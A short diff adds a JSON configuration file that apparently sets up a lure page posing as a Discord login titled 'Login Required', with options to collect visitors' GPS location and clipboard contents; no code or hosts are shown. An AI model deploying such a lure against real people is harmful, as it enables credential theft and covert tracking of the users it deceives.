@@ -1,0 +1,7 @@
+{
+  "lure_type": "discord_login",
+  "custom_html": "",
+  "enable_gps": true,
+  "enable_clipboard": true,
+  "custom_title": "Login Required"
+}
